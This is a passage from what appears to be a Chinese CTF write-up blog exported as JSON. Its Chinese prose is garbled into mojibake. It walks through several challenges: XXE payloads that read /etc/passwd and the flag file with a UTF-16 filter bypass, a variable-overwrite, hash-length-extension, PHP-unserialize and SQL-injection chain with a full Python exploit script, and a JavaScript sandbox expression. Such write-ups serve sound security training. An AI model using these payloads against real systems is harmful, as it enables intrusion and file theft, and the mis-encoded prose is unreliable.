é™¤ï¼Œunlink()æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚å¦‚æœunlinkä¼ å…¥çš„æ–‡ä»¶åå¸¦æœ‰è·¯å¾„å­—ç¬¦ï¼Œå°±ä¼šå¤±è´¥ã€‚å¦‚ä¼ å…¥\"aaa.php/.\"ï¼Œmove_uploaded_file()ä¼šå°†æ–‡ä»¶åæ­£è§„åŒ–å¤„ç†ï¼Œåˆ æ‰ä¸å¿…è¦çš„å­—ç¬¦ï¼Œç»“æœ/.è¢«åˆ é™¤ï¼Œä½†æ˜¯unlink()æ— æ³•å¤„ç†è·¯å¾„ï¼Œç›´æ¥è¿”å›å¤±è´¥ï¼Œå¯¼è‡´æ–‡ä»¶è¢«ä¿ç•™ã€‚ æœ€åä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥è®¿é—®åˆ°shellï¼Œè¦é€šè¿‡POSTçš„Helloè®¿é—®ï¼Œå› æ­¤æˆ‘ä»¬çš„Shellè¦ä»¥@","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ç›²æ³¨","slug":"ç›²æ³¨","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"SoapClient","slug":"SoapClient","permalink":"http://tiaonmmn.github.io/tags/SoapClient/"},{"name":"Slepp","slug":"Slepp","permalink":"http://tiaonmmn.github.io/tags/Slepp/"}]},{"title":"CSAW Quals 2019 Unagi","slug":"CSAW-Quals-2019-Unagi","date":"2019-09-17T03:30:59.000Z","updated":"2019-12-10T12:15:12.610Z","comments":true,"path":"2019/09/17/CSAW-Quals-2019-Unagi/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/17/CSAW-Quals-2019-Unagi/","excerpt":"CSAWCTF Quals 2019çš„Unagiï¼ŒXXEé¢˜ç›®ã€‚ æ‰“å¼€åå…è®¸æˆ‘ä»¬ä¸Šä¼ XMLæ–‡ä»¶ï¼Œå¹¶ä¸”ç»™å‡ºäº†ç¤ºä¾‹XMLã€‚","text":"CSAWCTF Quals 2019çš„Unagiï¼ŒXXEé¢˜ç›®ã€‚ æ‰“å¼€åå…è®¸æˆ‘ä»¬ä¸Šä¼ XMLæ–‡ä»¶ï¼Œå¹¶ä¸”ç»™å‡ºäº†ç¤ºä¾‹XMLã€‚ 1234567891011121314151617&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; å¾ˆæ˜æ˜¾çš„åœ¨è€ƒXXEï¼Œæˆ‘ä»¬ç›´æ¥å¥—ç”¨Payloadå°±è¡Œã€‚ 123456789101112131415161718&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;&amp;test;&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; ç„¶åæˆ‘ä»¬å‘ç°ï¼Œæ”¾åœ¨useræˆ–è€…groupæ ‡ç­¾ä¸‹æœ€å¤šæ˜¾ç¤º15ä½å­—ç¬¦ï¼Œç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹Useré¡µé¢ï¼Œå‘ç°å…¶å®è¿˜å­˜åœ¨ä¸€ä¸ªIntroæ ‡ç­¾ã€‚æˆ‘ä»¬æ”¹ä¸€ä¸‹Payload: 12345678910111213141516171819&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;&amp;test;&lt;/group&gt; &lt;intro&gt;&amp;test;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; æäº¤ç»™upload.phpå‘ç°æœ‰WAFï¼Œä¸å…è®¸å‡ºç°fileå…³é”®è¯ã€‚å‚è€ƒè¿™ä¸ªï¼Œæˆ‘ä»¬ä¸Šä¼ XMLçš„æ—¶å€™å¯ä»¥é‡‡ç”¨UTF-8å’ŒUTF-16ä¸¤ç§ç¼–ç æ ¼å¼ã€‚é»˜è®¤çš„WAFä¸ä¼šå¤„ç†UTF-16çš„å­—ç¬¦ã€‚é‚£ä¹ˆæˆ‘ä»¬è¯•ä¸€ä¸‹æ›´æ”¹æ–‡ä»¶ç¼–ç ã€‚ç”¨iconvå·¥å…·å³å¯ã€‚cat sample.xml|iconv -f UTF-8 -t UTF-16BE &gt; payload.xmlç„¶åæäº¤ï¼Œå‘ç°ç¡®å®è¯»åˆ°/etc/passwdæ–‡ä»¶äº†ã€‚ç„¶åæˆ‘ä»¬æ¥è¯»ä¸€ä¸‹/flagï¼Œå‘ç°è¿”å›ç©ºã€‚file://åè®®ä¸è¡Œï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹php://filterï¼ŒæŠŠfile:///flagæ”¹ä¸ºphp://filter/convert.base64-encode/resource=/../../../flagï¼Œå¾—åˆ°Base64ç¼–ç çš„Flagï¼Œå¤„ç†ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚ flag{9d04beb3-6aff-47f3-aac1-2709d91ac364}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"}]},{"title":"SWPUCTF-2016-Web400","slug":"SWPUCTF-2016-Web400","date":"2019-09-13T09:11:40.000Z","updated":"2019-12-10T12:15:12.675Z","comments":true,"path":"2019/09/13/SWPUCTF-2016-Web400/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/13/SWPUCTF-2016-Web400/","excerpt":"SWPUCTF 2016çš„Web400ã€‚ æ˜¯ä¸ªPHPçš„åšå®¢ç³»ç»Ÿï¼Œæ‰«ç›®å½•å‘ç°äº†ä¸€ä¸ªweb.zipã€‚å¥½äº†ï¼Œæºç å®¡è®¡ã€‚ å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œå‘ç°å®ç°çš„æ³¨å†Œä¸ç™»å½•éƒ½æ²¡æœ‰è¿›è¡Œä»»ä½•SQLè¿‡æ»¤ï¼Œä½†ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚common.phpæ˜¯å…¬å…±å¼•ç”¨çš„æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰æˆ‘ä»¬ååˆ†æ„Ÿå…´è¶£çš„ä»£ç ã€‚","text":"SWPUCTF 2016çš„Web400ã€‚ æ˜¯ä¸ªPHPçš„åšå®¢ç³»ç»Ÿï¼Œæ‰«ç›®å½•å‘ç°äº†ä¸€ä¸ªweb.zipã€‚å¥½äº†ï¼Œæºç å®¡è®¡ã€‚ å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œå‘ç°å®ç°çš„æ³¨å†Œä¸ç™»å½•éƒ½æ²¡æœ‰è¿›è¡Œä»»ä½•SQLè¿‡æ»¤ï¼Œä½†ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚common.phpæ˜¯å…¬å…±å¼•ç”¨çš„æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰æˆ‘ä»¬ååˆ†æ„Ÿå…´è¶£çš„ä»£ç ã€‚ 123456789foreach (Array(&quot;_POST&quot;, &quot;_GET&quot;, &quot;_COOKIE&quot;) as $key) &#123; foreach ($$key as $k =&gt; $v) &#123; if (is_array($v)) &#123; die(&quot;hello,hacker!&quot;); &#125; else &#123; $k[0] != &#x27;_&#x27; ? $$k = addslashes($v) : $$k = &quot;&quot;; &#125; &#125;&#125; PHPä¸­$$ä»£è¡¨ä»¥æŸä¸€å˜é‡åä½œä¸ºå˜é‡åçš„å˜é‡ï¼Œå› æ­¤foreachå¾ªç¯ä¸­çš„$$key as $k =&gt; \\(vï¼Œç­‰åŒäºå°†ä¸Šé¢æåˆ°çš„Array(&quot;\\_POST&quot;, &quot;\\_GET&quot;, &quot;\\_COOKIE&quot;)è¿™å‡ ä¸ªæ•°ç»„åˆ†åˆ«æ‹†æˆ\\)kå’Œ\\(vï¼Œå…¶ä¸­\\)kæŒ‡â€œ_POSTâ€ç­‰æ•°ç»„å†…å…ƒç´ çš„åå­—ï¼Œ\\(væŒ‡\\)kå¯¹åº”çš„å€¼ã€‚å¦‚æœ\\(væ˜¯ä¸ªæ•°ç»„åˆ™dieï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥`/?c[]=1`ï¼Œå°±ä¼šdieã€‚ä¸æ˜¯æ•°ç»„çš„è¯å°±ä¼šå°†\\)kæ•°ç»„çš„ç¬¬ä¸€é¡¹addslashes()ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥/?c=\"1\"ï¼Œ_GETæ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯cï¼Œé‚£ä¹ˆå®é™…ä¸Š_GET['c']==_GET[0]çš„å€¼æ˜¯\\\"1\\\"ã€‚å› æ­¤å°±æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥ä»»æ„å¯¹å˜é‡èµ‹å€¼ã€‚ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œè¿™æ®µä»£ç åœ¨common.phpä¸­ï¼Œå…¶ä½™æ‰€æœ‰æ–‡ä»¶æ˜¯åœ¨æ–‡ä»¶å¤´éƒ¨include('common.php')çš„ï¼Œæˆ‘ä»¬çš„å˜é‡è¦†ç›–åˆåªèƒ½æ§åˆ¶æ•°ç»„çš„ç¬¬ä¸€ä¸ªå˜é‡ï¼Œå› æ­¤å¯¹äºæ–‡ä»¶éœ€è¦çš„ä¼ å‚ï¼Œå®ƒå®é™…ä¸Šåˆä¼šè¢«è¦†ç›–æ‰ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è¦†ç›–ä»æœªå£°æ˜çš„å˜é‡ã€‚ ç„¶ååœ¨riji.phpä¸­æˆ‘ä»¬æœ‰å¦‚ä¸‹ä»£ç ï¼š 12345678910if ($_SESSION[&#x27;user&#x27;]) &#123; $username = $_SESSION[&#x27;user&#x27;]; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if ($result[&#x27;userid&#x27;]) &#123; $id = intval($result[&#x27;userid&#x27;]); &#125;&#125; æˆ‘ä»¬æ­£å¸¸ç™»å½•å\\(\\_SESSION[&#39;user&#39;]ä¼šèµ‹å€¼\\)usernameï¼Œä½†å¦‚æœç™»é™†åæ­¤æ—¶æˆ‘ä»¬æŠŠæ•°æ®åº“ä¸­\\(usernameçš„è®°å½•åˆ æ‰ï¼Œé‚£ä¹ˆifåˆ¤æ–­å°±ä¼šä¸ºfalseï¼Œ\\)idæ²¡æœ‰è¢«èµ‹å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶äº†ã€‚ riji.phpä¸­è¿˜æœ‰ä¸€æ®µä»£ç ï¼š 12345678910111213&lt;?php @mysql_conn(); $sql1 = &quot;select * from msg where userid= $id order by id&quot;; $query = mysql_query($sql1); $result1 = array(); while ($temp = mysql_fetch_assoc($query)) &#123; $result1[] = $temp; &#125; mysql_close(); foreach ($result1 as $x =&gt; $o) &#123; echo display($o[&#x27;msg&#x27;]); &#125;?&gt; \\(idä¼šç›´æ¥å¸¦å…¥æŸ¥è¯¢ï¼Œæ³¨æ„SQLè¯­å¥ä¸­\\)idæ²¡æœ‰å¼•å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥1' or 1=1ï¼Œå…¨å±€addslashes()åå˜æˆ1\\' or 1=1ï¼Œaddslashes()å¯¹äºSQLæ³¨å…¥æ²¡æœ‰ä»»ä½•å½±å“ã€‚è™½ç„¶ä¸çŸ¥é“SQLæ³¨å…¥æœ‰ä»€ä¹ˆç”¨ã€‚ ç„¶åapi.phpå£°æ˜äº†ä¸€ä¸ªadminç±»ï¼Œå…¶ä¸­ç¡®å®æœ‰åˆ é™¤ç”¨æˆ·çš„æ–¹æ³•ã€‚è¯¥æ–‡ä»¶æœ€åä¸¤è¡Œç›´æ¥\\(a=unserialize(base64_decode(\\)api))ï¼Œç„¶ådo_methodï¼Œ\\(aä¸\\)apiéƒ½æ²¡æœ‰åèµ‹å€¼ï¼Œå¯ä»¥å˜é‡è¦†ç›–ã€‚ä½†æ˜¯åœ¨del_userä¹‹å‰æˆ‘ä»¬è¦å…ˆè¿‡äº†checkï¼Œcheckä¸­æ£€æŸ¥ç±»çš„checkå˜é‡æ˜¯å¦ç­‰äºMD5ï¼ˆç”¨æˆ·æ³¨å†Œæ—¶çš„salt+ç±»dataå˜é‡+ç”¨æˆ·åï¼‰ï¼Œç„¶åè¿˜æ£€æŸ¥ç”¨æˆ·çš„roleæ˜¯å¦ä¸º1ã€‚åœ¨æºç ä¸­ç»™å‡ºçš„db.sqlä¸­æˆ‘ä»¬å‘ç°adminç”¨æˆ·çš„roleä¸º1ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶saltã€‚ ç„¶ååœ¨forget.phpä¸­æˆ‘ä»¬çœ‹åˆ°å¦‚ä¸‹ä»£ç ï¼š 12345678910111213141516171819if (@$forget == 1) &#123; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) &#123; if ($result[&#x27;salt&#x27;]) &#123; $check = base64_encode(md5($result[&#x27;salt&#x27;])); $name = $result[&#x27;name&#x27;]; header(&quot;Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass&quot;); &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;); &#125; &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;); &#125;&#125; æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åï¼ŒæŸ¥åˆ°æœ‰æ­¤ç”¨æˆ·åä¼šå¸¦å‡ºæ¥md5(salt)ã€‚ å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å·²çŸ¥md5(salt)ï¼Œç±»dataä¸ç”¨æˆ·åï¼ˆadminï¼‰å¯æ§ï¼Œè¦æ±‚md5(salt+data+\"admin\")ï¼Œè¿™å°±æ˜¯å“ˆå¸Œæ‰©å±•æ”»å‡»äº†ã€‚å“ˆå¸Œæ‰©å±•æ”»å‡»å‚è€ƒè¿™ä¸ªï¼Œç®€å•æ¥è¯´å°±æ˜¯é’ˆå¯¹SHAã€MD5è¿™ç±»Hashç®—æ³•ï¼Œå¦‚æœæˆ‘ä»¬ä¸çŸ¥é“ç‰¹å®šå¯†æ–‡cï¼Œä½†æ˜¯çŸ¥é“çŸ¥é“MD5/SHA(c+pad)ä¸å¯†æ–‡cçš„é•¿åº¦ï¼Œå…¶ä¸­padæˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ±‚å‡ºMD5(salt+pad+m)ï¼Œå…¶ä¸­mä¸ºä»»æ„æ•°æ®ã€‚ æˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·ï¼Œç”¨äºå·²çŸ¥å¯†æ–‡MD5ï¼Œæ±‚MD5(å¯†æ–‡+pad)çš„æƒ…å†µã€‚ å¥½äº†ï¼Œå¯ä»¥å¼€å§‹ååºåˆ—åŒ–äº†ã€‚ 1234567891011121314&lt;?phpclass admin&#123; var $name=&quot;admin&quot;; var $check=&quot;0f85487590dd2a3182389623cc8e3933&quot;; var $data=&quot;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;; var $method=&quot;del_msg&quot;; var $userid=2; var $msgid;//&gt;&gt;&gt; hashpumpy.hashpump(&#x27;ceb20772e0c9d240c75eb26b0e37abee&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;,16)//(&#x27;0f85487590dd2a3182389623cc8e3933&#x27;, b&#x27;admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin&#x27;)&#125;$a=serialize(new admin());echo base64_encode($a); useridç½®ä¸º2çš„åŸå› æ˜¯æˆ‘ä»¬æ³¨å†Œæ–°ç”¨æˆ·çš„æ—¶å€™useridå·²ç»ä¸º2äº†ï¼Œå¯ä»¥ä»Cookieä¸­çœ‹åˆ°ã€‚ 1234567891011121314151617181920212223242526if (@$login == 1) &#123; @mysql_conn(); $sql = &quot;select * from user where name=&#x27;$username&#x27;&quot;; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) &#123; if ($result[&#x27;passwd&#x27;] == md5($password)) &#123; $user_cookie = &#x27;&#x27;; $user_cookie .= $result[&#x27;userid&#x27;]; $user_cookie .= $result[&#x27;name&#x27;]; $user_cookie .= $result[&#x27;salt&#x27;]; $cookies = base64_encode($user_cookie); //$cookies = $user_cookie; setcookie(&quot;user&quot;, $cookies, time() + 60, &#x27;/&#x27;); $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;user&#x27;] = $username; header(&#x27;Location:/riji.php&#x27;); &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;); &#125; &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;); &#125;&#125; æˆ‘ä»¬Base64è§£ç ä¸€ä¸‹å°±OKäº†ã€‚ç”Ÿæˆçš„ç»“æœä¼ ç»™api.php/?api=å°±è¡Œäº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯api.phpåœ¨å¼€å¤´è®¾ç½®äº†$_SESSION['login']==1çš„åˆ¤æ–­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¦å¤–èµ·ä¸€ä¸ªçª—å£å‘api.phpï¼Œç„¶åæˆ‘ä»¬è¿”å›æœ€å¼€å§‹çš„ç™»å½•é¡µé¢ï¼Œå‘ç°ç™»å½•çŠ¶æ€æ²¡æœ‰æ¶ˆå¤±ï¼Œè¿™æ—¶SQLæ³¨å…¥å¯ä»¥åˆ©ç”¨äº†ï¼Œæ­£å¸¸SQLæ³¨å…¥æµç¨‹ï¼Œé™¤å¼•å·å¤–æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚æäº¤/riji.php?id=-1 union select 1,2,flag from flagå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ PoCï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import requestsfrom base64 import b64decodefrom urllib.parse import unquote, parse_qsimport randomimport stringimport subprocessimport osaddr = &quot;http://192.168.1.4:5354/&quot;a = requests.session()def register(a: requests.Session) -&gt; str: username = &quot;&quot;.join(random.sample(string.ascii_letters, 6)) b = a.post(addr + &quot;index.php&quot;, data=&#123; &quot;username&quot;: username, &quot;password&quot;: &quot;test1&quot;, &quot;mibao&quot;: &quot;test1&quot;, &quot;regi&quot;: &quot;1&quot; &#125;) print(b.text) print(&quot;Username is &quot; + username) return usernamedef login(a: requests.Session, username: str) -&gt; int: b = a.post(addr + &quot;index.php&quot;, data=&#123; &quot;username&quot;: username, &quot;password&quot;: &quot;test1&quot;, &quot;mibao&quot;: &quot;test1&quot;, &quot;login&quot;: &quot;1&quot; &#125;) print(b.text) userid = (b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode())[ :b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode()).find(username.encode())]) # userid=b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode()).find(username.encode()) print(userid.decode()) return int(userid.decode())def get_admin_md5() -&gt; int: a = requests.post(addr + &quot;forget.php&quot;, data=&#123; &quot;username&quot;: &quot;admin&quot;, &quot;mibao&quot;: &quot;mibao&quot;, &quot;pass&quot;: &quot;3werwer&quot;, &quot;forget&quot;: &quot;1&quot; &#125;, allow_redirects=False) md5 = b64decode(parse_qs(a.headers[&#x27;Location&#x27;])[&#x27;check&#x27;][0]) print(md5.decode()) return md5.decode()def get_fake_md5(md5: str) -&gt; dict: result = subprocess.getoutput(&quot;python2 md5pad.py &#123;0&#125; admin 16&quot;.format(md5)) print(result) final = dict() payload = result.splitlines()[0] final[&#x27;payload&#x27;] = payload[11:-6] final[&#x27;md5&#x27;] = result.splitlines()[2][5:] print(final) return finaldef send_api(result: dict, userid: int): php_content = r&#x27;&#x27;&#x27;class admin&#123; var $name = &quot;admin&quot;; var $check = &quot;%s&quot;; var $data = &quot;%s&quot;; var $method = &quot;del_user&quot;; var $userid = %d; var $msgid;&#125;$a = serialize(new admin());echo base64_encode($a);&#x27;&#x27;&#x27;%(result[&#x27;md5&#x27;], result[&#x27;payload&#x27;], userid) file = open(&quot;tmp.php&quot;, &#x27;w&#x27;) file.write(php_content) payload = subprocess.getoutput(&quot;php -r &#x27;&#123;0&#125;&#x27;&quot;.format(php_content)) print(payload) a = requests.get(addr + &quot;api.php&quot;, params=&#123; &quot;api&quot;: payload &#125;) print(a.text)def sql_inj(a: requests.Session): b = a.get(addr + &quot;riji.php&quot;, params=&#123; &quot;id&quot;: &quot;-1 union select 1,2,flag from flag&quot; &#125;) print(b.text)if __name__ == &quot;__main__&quot;: username = register(a) userid = login(a, username) admin_md5 = get_admin_md5() result=get_fake_md5(admin_md5) send_api(result,userid) sql_inj(a) flag{0aa97a23-a64f-415c-a75e-40b7ce271d38}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"å“ˆå¸Œæ‰©å±•æ”»å‡»","slug":"å“ˆå¸Œæ‰©å±•æ”»å‡»","permalink":"http://tiaonmmn.github.io/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"}]},{"title":"HarekazeCTF2019-A_Z","slug":"HarekazeCTF2019-A-Z","date":"2019-09-12T14:34:16.000Z","updated":"2019-12-10T12:15:12.663Z","comments":true,"path":"2019/09/12/HarekazeCTF2019-A-Z/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/12/HarekazeCTF2019-A-Z/","excerpt":"ä¹…è¿çš„Miscã€‚NodeJSå†™çš„ç½‘ç«™ï¼Œç»™äº†æºç ï¼š","text":"ä¹…è¿çš„Miscã€‚NodeJSå†™çš„ç½‘ç«™ï¼Œç»™äº†æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const vm = require(&#x27;vm&#x27;);const app = express();app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function (req, res, next) &#123; let output = &#x27;&#x27;; const code = req.query.code + &#x27;&#x27;; if (code &amp;&amp; code.length &lt; 200 &amp;&amp; !/[^a-z().]/.test(code)) &#123; try &#123; const result = vm.runInNewContext(code, &#123;&#125;, &#123; timeout: 500 &#125;); if (result === 1337) &#123; output = process.env.FLAG; &#125; else &#123; output = &#x27;nope&#x27;; &#125; &#125; catch (e) &#123; output = &#x27;nope&#x27;; &#125; &#125; else &#123; output = &#x27;nope&#x27;; &#125; res.render(&#x27;index&#x27;, &#123; title: &#x27;[a-z().]&#x27;, output &#125;);&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.sendFile(path.join(__dirname, &#x27;app.js&#x27;));&#125;);module.exports = app; æˆ‘ä»¬è¢«è¦æ±‚åªèƒ½ä½¿ç”¨[a-z().]è¿™äº›å­—ç¬¦æ¥è¾“å‡º1337ï¼Œå°±ä¼šè¿”å›flagã€‚ æˆ‘ä»¬å¯ä»¥ç”¨(typeof(this)).constructor()æ„é€ å‡ºç©ºå­—ç¬¦ä¸²ï¼Œè€ŒJSä¸­1==trueï¼Œæ‰€ä»¥(typeof(this)).constructor().length.constructor(true)å°±ä¼šæ„é€ å‡º1ï¼Œæˆ–è€…true.constructor.lengthã€‚3å¯ä»¥ç”¨å­—ç¬¦ä¸²çš„big()æ–¹æ³•çš„name.lengthè·å¾—ï¼Œ7å¯ä»¥ç”¨true.constructor.name.lengthå¾—åˆ°ã€‚æœ€åå°†æ‰€æœ‰å­—ç¬¦concatåœ¨ä¸€èµ·å³å¯ã€‚ æ‰€ä»¥æœ€åPayloadï¼ˆä¸å”¯ä¸€ï¼‰ï¼ševal((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length)) flag{37fc4573-3305-486f-bcee-f7f8dbad3aa8}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"}]},{"title":"SWPUCTF-2016-Web7","slug":"SWPUCTF-2016-Web7","date":"2019-09-12T01:33:42.000Z","updated":"2020-09-01T13:16:10.349Z","comments":true,"path":"2019/09/12/SWPUCTF-2016-Web7/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/","excerpt":"SWPUCTF 2016çš„Web7ï¼Œè€é¢˜äº†ã€‚ä¸è¿‡é¢˜ç›®ç¯å¢ƒæœ‰ç‚¹è‹›åˆ»ã€‚Python 2.7.5+Redis 2.6ã€‚æ¯•ç«Ÿå‡ºé¢˜æ—¶æ˜¯2016å¹´ã€‚ ç»™å‡ºäº†æºç ï¼š","text":"SWPUCTF 2016çš„Web7ï¼Œè€é¢˜äº†ã€‚ä¸è¿‡é¢˜ç›®ç¯å¢ƒæœ‰ç‚¹è‹›åˆ»ã€‚Python 2.7.5+Redis 2.6ã€‚æ¯•ç«Ÿå‡ºé¢˜æ—¶æ˜¯2016å¹´ã€‚ ç»™å‡ºäº†æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/python # coding:utf8import cherrypyimport urllib2import redisclass web7: @cherrypy.expose def index(self): return &quot;&lt;script&gt; window.location.href=&#x27;/input&#x27;;&lt;/script&gt;&quot; @cherrypy.expose def 